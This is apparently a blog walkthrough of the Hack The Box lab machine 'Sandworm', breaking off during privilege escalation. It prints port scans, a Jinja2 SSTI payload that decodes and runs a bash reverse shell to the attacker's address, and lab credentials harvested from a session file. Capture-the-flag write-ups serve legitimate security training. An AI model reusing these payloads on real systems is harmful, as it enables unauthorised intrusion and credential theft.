---
layout: single
title: Sandworm - Hack The Box
excerpt: "Sandworm is a medium-difficulty machine on the HTB platform. In order to access it, we need to obtain a PGP key to carry out an SSTI (Server-Side Template Injection). We'll need to make some maneuvers between user accounts, and then, to elevate privileges, we'll take advantage of the SUID permissions of firejail."
date: 2023-08-24
classes: wide
header:
  teaser: assets/images/htb-writeup-Sandworm/intro.PNG
  teaser_home_page: true
  icon: assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Firejail
  - PGP
  - SSTI
  - SUID
---
![](../assets/images/htb-writeup-Sandworm/sandworm.jpeg)


**RECON**

**PORTS SCAN**

We performed a scan of all possible open ports on the victim machine.

```ruby
❯ sudo nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv 10.10.11.218 -oG allPorts
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 13:20 CEST
Initiating SYN Stealth Scan at 13:20
Scanning 10.10.11.218 [65535 ports]
Discovered open port 22/tcp on 10.10.11.218
Discovered open port 80/tcp on 10.10.11.218
Discovered open port 443/tcp on 10.10.11.218
Completed SYN Stealth Scan at 13:20, 11.42s elapsed (65535 total ports)
Nmap scan report for 10.10.11.218
Host is up, received user-set (0.052s latency).
Scanned at 2023-08-26 13:20:15 CEST for 12s
Not shown: 65330 closed tcp ports (reset), 202 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds
           Raw packets sent: 66953 (2.946MB) | Rcvd: 65535 (2.621MB)

```

**SERVICE AND VERSION SCAN**

```ruby
❯ sudo nmap -p22,80,443 -sCV 10.10.11.218 -oN target
[sudo] contraseña para anonimo: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 13:38 CEST
Nmap scan report for ssa.htb (10.10.11.218)
Host is up (0.050s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
```

We add the domain to the /etc/hosts file.

At the top of the page, there is a contact button that will redirect us to a form. This form is designed to send an encrypted PGP message. With this, we can check if there's a possibility of performing any kind of command execution.

![](../assets/images/htb-writeup-Sandworm/fotoWeb1.PNG)

If we look at the bottom of the text box, there is a link that redirects us to a guide. This guide involves sending a message using a public key, and the website allows us to practice with its own public key.

![](../assets/images/htb-writeup-Sandworm/fotoWeb2.PNG)

This is the GPG public key provided to us for conducting tests.

![](../assets/images/htb-writeup-Sandworm/fotoWeb3.PNG)

If we take a closer look at the guide, there's a signature verifier that allows us to use our own keys.

![](../assets/images/htb-writeup-Sandworm/fotoWeb4.PNG)

**Exploit with GPG**

What we will do now is generate our GPG key and check if it is vulnerable to STTI.

First, we will start by generating a PGP key on the following [page](https://youritmate.us/pgp/).

![](../assets/images/htb-writeup-Sandworm/fotoWeb5.PNG)

Afterwards, copy the private key on the next [page](http://www.2pih.com/pgp.html), paste the key, and enter the optional password if you set one. Then, input a message that you would like to use.

![](../assets/images/htb-writeup-Sandworm/fotoWeb6.PNG)

It's important to understand that we are conducting this test to assess what we can manipulate and, as we can see, we are able to manipulate the name.

![](../assets/images/htb-writeup-Sandworm/fotoWeb7.PNG)

So, let's check if it's vulnerable to SSTI by changing the "Your name" parameter.

The steps remain the same, we generate a new PGP key with the updated name.

![](../assets/images/htb-writeup-Sandworm/fotoWeb8.PNG)

Perfect! There's an SSTI.

![](../assets/images/htb-writeup-Sandworm/fotoWeb10.PNG)

**Intrusion**

We encode the reverse shell in base64.

```ruby
❯ echo "bash -c 'bash -i >& /dev/tcp/10.10.15.23/4444 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMy80NDQ0IDA+JjEnCg==
```

Now we will change the vulnerable SSTI parameter to the following payload.

```ruby
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
```
![](../assets/images/htb-writeup-Sandworm/fotoWeb11.PNG)

And if everything has gone well, we have a reverse shell.

```ruby
❯ sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.23] from (UNKNOWN) [10.10.11.218] 46060
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
atlas@sandworm:/var/www/html/SSA$ 
```

**Privilege escalation**


**Lateral movement (atlas -> silentobserver)**

In the `.config` directory, there are two folders that we can only access since we don't have permissions for firejail.

```ruby
atlas@sandworm:~/.config$ ls  
ls
firejail
httpie
atlas@sandworm:~/.config$ cd firejail   
cd firejail
bash: cd: firejail: Permission denied
```
If we enter the directory `/.config/httpie/sessions/localhost_5000` we can see that there's a file with the `.json` extension containing what appears to be credentials for a user named `silentobserver`.

```ruby
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ ls
ls
admin.json
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```
Now, let's try to see if we can connect via SSH to the user `silentobserver` with the password `quietLiketheWind22`.

```ruby
❯ ssh silentobserver@10.10.11.218
silentobserver@10.10.11.218's password:
silentobserver@sandworm:~$ cat user.txt 
c091c7f4873edcc616a41df602813e21
silentobserver@sandworm:~$ 
```
**Vertical Privilege Escalation**

We deploy [pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) to monitor the running tasks.

`❯ python3 -m http.server 80`

```ruby
silentobserver@sandworm:~$ wget 10.10.15.23/pspy64
--2023-08-26 17:33:55--  http://10.10.15.23/pspy64
Connecting to 10.10.15.23:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                  100%[==============================================================================>]   2.96M  3.64MB/s    in 0.8s    

2023-08-26 17:33:56 (3.64 MB/s) - ‘pspy64’ saved [3104768/3104768]

silentobserver@sandworm:~$ chmod +x pspy64

```
